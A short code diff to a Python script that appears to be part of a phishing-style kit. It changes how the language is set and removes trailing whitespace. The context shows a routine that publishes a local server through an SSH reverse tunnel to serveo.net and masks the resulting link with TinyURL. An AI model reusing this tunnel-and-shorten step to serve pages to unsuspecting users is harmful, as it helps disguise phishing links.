@@ -11,10 +11,9 @@ from sys import stdout, argv
 from Defs.Configurations import readConfig, ifSettingsNotExists
 from Defs.Languages import *
 
-checkAndSetLanguage() #WIP!!! MUST BE UPDATED
-
 RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
 
+languageSelector()
 ifSettingsNotExists()
 config = readConfig()
 
@@ -105,15 +104,15 @@ def runServeo():
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
     sleep(7)
     try:
-        output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url",shell=True)    
+        output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url",shell=True)
         url = str(output).strip("b ' \ n")
         print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
-        print("\n") 
+        print("\n")
         data = urlopen("http://tinyurl.com/api-create.php?url="+url)
         url = data.read()
         link = url.decode('utf-8')
         print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(RED, DEFAULT, GREEN) + link + "{1}".format(RED, DEFAULT, GREEN))
-        print("\n")  
+        print("\n")
     except subprocess.CalledProcessError:
         print ('''
   ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _
